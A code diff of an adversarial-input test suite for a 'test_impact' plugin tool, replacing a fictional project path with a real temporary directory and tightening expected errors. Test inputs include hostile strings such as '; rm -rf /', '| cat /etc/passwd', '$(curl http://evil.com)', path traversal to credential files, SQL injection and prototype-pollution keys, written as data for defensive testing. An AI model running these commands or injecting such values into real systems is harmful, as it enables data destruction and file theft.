@@ -1,4 +1,7 @@
-import { describe, expect, test } from 'bun:test';
+import { afterAll, describe, expect, test } from 'bun:test';
+import * as fs from 'node:fs';
+import * as os from 'node:os';
+import * as path from 'node:path';
 import type { ToolContext } from '@opencode-ai/plugin';
 import type { ToolResult } from '../../tools/create-tool';
 import { test_impact } from '../../tools/test-impact.js';
@@ -9,6 +12,22 @@ import { test_impact } from '../../tools/test-impact.js';
 function resultToString(result: ToolResult): string {
 	return typeof result === 'string' ? result : result.output;
 }
+
+/**
+ * Real, existing directory for tests that rely on ctx.directory resolving
+ * successfully (no explicit working_directory arg). '/project' is a fictional
+ * path — resolveWorkingDirectory's fallback branch does not existence-check
+ * it, but analyzeImpact() does read from it, so a nonexistent fallback throws
+ * and these tests fail wherever '/project' does not happen to already exist
+ * on disk (they were previously false-passing only when it did).
+ */
+const REAL_PROJECT_DIR = fs.mkdtempSync(
+	path.join(os.tmpdir(), 'test-impact-adv-'),
+);
+
+afterAll(() => {
+	fs.rmSync(REAL_PROJECT_DIR, { recursive: true, force: true });
+});
 
 /**
  * Helper to create a minimal ToolContext mock for testing
@@ -39,7 +58,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('../../../etc/passwd passes through to analyzer untestedFiles', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['../../../etc/passwd'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -51,7 +70,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('nested path traversal passes through', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['a/b/../../../../../../etc/passwd'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -62,14 +81,22 @@ describe('test_impact — adversarial input handling', () => {
 		});
 
 		test('Windows path traversal passes through', async () => {
+			// The project root (ctx.directory) must be an absolute path that exists;
+			// on a Linux CI host "C:\\project" is not absolute and is rejected before
+			// the changedFiles are ever examined. Use a valid absolute root — the
+			// Windows-style traversal string in changedFiles is the actual subject,
+			// and it flows through to untestedFiles unsanitized.
 			const result = await test_impact.execute(
 				{ changedFiles: ['..\\..\\..\\Windows\\System32\\config\\sam'] },
-				createMockCtx('C:\\project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 			expect(Array.isArray(parsed.untestedFiles)).toBe(true);
+			expect(parsed.untestedFiles).toContain(
+				'..\\..\\..\\Windows\\System32\\config\\sam',
+			);
 		});
 	});
 
@@ -77,7 +104,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('semicolon command separator passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['; rm -rf /'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -89,7 +116,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('pipe operator passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['| cat /etc/passwd'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -99,7 +126,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('backtick substitution passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['`wget http://evil.com`'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -109,7 +136,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('command substitution $(...) passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['$(curl http://evil.com)'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -121,7 +148,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('null byte passes to analyzer as literal path', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/path/with\0null'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -134,7 +161,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('multiple null bytes pass to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['\0\0\0/etc/passwd'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -150,7 +177,7 @@ describe('test_impact — adversarial input handling', () => {
 			const startTime = Date.now();
 			const result = await test_impact.execute(
 				{ changedFiles: massiveArray },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const duration = Date.now() - startTime;
 
@@ -165,7 +192,7 @@ describe('test_impact — adversarial input handling', () => {
 
 			const result = await test_impact.execute(
 				{ changedFiles: [longPath] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -177,7 +204,7 @@ describe('test_impact — adversarial input handling', () => {
 
 			const result = await test_impact.execute(
 				{ changedFiles: [deepPath] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -189,7 +216,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('__proto__ passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['__proto__'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -199,7 +226,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('constructor passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['constructor'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -209,7 +236,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('__proto__.polluted passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['__proto__.polluted'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -219,7 +246,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('JSON stringified __proto__ object passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [JSON.stringify({ __proto__: { polluter: true } })] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -239,7 +266,18 @@ describe('test_impact — adversarial input handling', () => {
 			);
 			const parsed = JSON.parse(resultToString(result));
 
-			expect(parsed).toHaveProperty('untestedFiles');
+			// A non-existent working_directory is rejected by the existence check
+			// in resolveWorkingDirectory (invariant 4). The literal path — spaces
+			// intact — is echoed in the structured error, proving it was handled as
+			// a path string and never interpolated into a shell. On Windows the
+			// resolved path renders with backslashes (drive-relative resolution
+			// of a leading '/'), so normalize separators before comparing —
+			// the property under test is that the segment text survives intact,
+			// not which separator character the platform used.
+			expect(parsed.success).toBe(false);
+			expect(parsed.error.replace(/\\/g, '/')).toContain(
+				'/path with spaces/project',
+			);
 		});
 
 		test('quotes in working_directory are handled', async () => {
@@ -252,7 +290,14 @@ describe('test_impact — adversarial input handling', () => {
 			);
 			const parsed = JSON.parse(resultToString(result));
 
-			expect(parsed).toHaveProperty('untestedFiles');
+			// Non-existent working_directory is rejected; the literal quoted path is
+			// echoed in the error, proving quotes are handled as path text. Windows
+			// renders the resolved path with backslashes — normalize before
+			// comparing (see the "spaces" test above for why).
+			expect(parsed.success).toBe(false);
+			expect(parsed.error.replace(/\\/g, '/')).toContain(
+				"/path with 'quotes'/project",
+			);
 		});
 
 		test('semicolon in working_directory is passed to analyzer', async () => {
@@ -265,8 +310,16 @@ describe('test_impact — adversarial input handling', () => {
 			);
 			const parsed = JSON.parse(resultToString(result));
 
-			// The working_directory with semicolon is passed through
-			expect(parsed).toHaveProperty('untestedFiles');
+			// Non-existent working_directory is rejected. The full literal path —
+			// including "; echo hacked" — is echoed back in the structured error,
+			// proving the semicolon is treated as ordinary path text and never
+			// executed as a shell command separator. Windows renders the resolved
+			// path with backslashes — normalize before comparing (see the
+			// "spaces" test above for why).
+			expect(parsed.success).toBe(false);
+			expect(parsed.error.replace(/\\/g, '/')).toContain(
+				'/path; echo hacked/project',
+			);
 		});
 
 		test('null byte in working_directory causes error', async () => {
@@ -285,7 +338,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('empty string working_directory uses cwd fallback', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['src/index.ts'], working_directory: '' },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -299,7 +352,12 @@ describe('test_impact — adversarial input handling', () => {
 			);
 			const parsed = JSON.parse(resultToString(result));
 
-			expect(parsed).toHaveProperty('untestedFiles');
+			// Non-existent working_directory is rejected without crashing; the
+			// Unicode path round-trips intact through the structured error.
+			// Windows renders the resolved path with backslashes — normalize
+			// before comparing (see the "spaces" test above for why).
+			expect(parsed.success).toBe(false);
+			expect(parsed.error.replace(/\\/g, '/')).toContain('/проект/日本語');
 		});
 	});
 
@@ -307,7 +365,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('object instead of string passes through to analyzer (BUG: no type validation)', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [{ file: 'src/index.ts' }] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -319,7 +377,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('string instead of array is rejected at validation', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: 'not-an-array' },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -329,7 +387,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('numbers in array pass through to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [42, 123] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -340,7 +398,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('undefined in array passes through', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [undefined, 'valid.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -350,7 +408,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('null in array passes through', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [null, 'valid.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -360,7 +418,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('boolean in array passes through', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [true, false] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -372,7 +430,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('DROP TABLE pattern appears in untestedFiles', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ["'; DROP TABLE users; --"] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -382,7 +440,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('OR 1=1 pattern appears in untestedFiles', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ["' OR '1'='1"] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -392,7 +450,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('UNION SELECT pattern appears in untestedFiles', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ["' UNION SELECT password FROM users--"] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -404,7 +462,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('hex encoding pattern appears in untestedFiles', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['0xhexencoded'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -423,7 +481,7 @@ describe('test_impact — adversarial input handling', () => {
 						'valid2.ts',
 					],
 				},
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -437,7 +495,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('empty array is rejected', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: [] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -450,7 +508,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('RTL override character (U+202E) passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/path/with\u202E malicious.txt'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -460,7 +518,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('zero-width space (U+200B) passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/path/with\u200B zero-width/file.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -472,7 +530,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('combining Unicode characters pass to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/path/\u0301\u0327\u0302 file.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -482,7 +540,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('emoji in file path passes to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/path/📁/file.ts', '/path/🚀/test.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -493,7 +551,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('fullwidth Unicode characters pass to analyzer', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: ['/ｖｅｒｙ/ｗｉｄｅ/ｐａｔｈ/file.ts'] },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -505,7 +563,10 @@ describe('test_impact — adversarial input handling', () => {
 
 	describe('validation failures', () => {
 		test('missing changedFiles is rejected', async () => {
-			const result = await test_impact.execute({}, createMockCtx('/project'));
+			const result = await test_impact.execute(
+				{},
+				createMockCtx(REAL_PROJECT_DIR),
+			);
 			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
@@ -515,7 +576,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('null changedFiles is rejected', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: null },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
@@ -525,7 +586,7 @@ describe('test_impact — adversarial input handling', () => {
 		test('non-array changedFiles is rejected', async () => {
 			const result = await test_impact.execute(
 				{ changedFiles: 'not-an-array' },
-				createMockCtx('/project'),
+				createMockCtx(REAL_PROJECT_DIR),
 			);
 			const parsed = JSON.parse(resultToString(result));
 
